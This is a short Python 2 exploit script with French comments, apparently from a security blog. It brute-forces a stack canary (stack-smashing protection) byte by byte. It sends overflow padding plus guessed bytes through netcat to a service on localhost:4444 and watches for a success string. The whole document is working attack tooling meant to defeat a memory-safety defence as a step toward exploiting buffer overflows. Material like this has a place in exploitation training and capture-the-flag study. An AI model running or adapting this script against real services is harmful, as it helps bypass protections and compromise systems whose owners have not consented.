# Brute Force Stack Smashing Protection
# Auteur: Geluchat
# http://www.dailysecurity.fr
# Brute Force les octets du canary 1 par 1
# Usage: Nombre de caractères pour provoquer l'overflow, Chaine qui apparait quand le canary est bon
import os
import re
import sys
from subprocess import Popen, PIPE, STDOUT
 
Cookie = ""
grep_stdout=""
 
if len(sys.argv) < 3:
        sys.exit('Usage: %s Nombre Overflow Chaine a trouver' % sys.argv[0])
 
# On lance le programme
 
index=0
while index!=4:
        grep_stdout=""
        buff=-1
        while re.search(sys.argv[2],grep_stdout) is None:
                buff+=1
                if buff==256:
                        print "[-] Cookie introuvable"
                        exit(-1)
                p = Popen(['nc','localhost','4444'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
                grep_stdout = p.communicate(input='f'*int(sys.argv[1])+Cookie+str(chr(buff)))[0]
                print grep_stdout

        Cookie+=str(chr(buff))
        index+=1
 
print "[+] Le cookie est : 0x"+ Cookie.encode("hex")
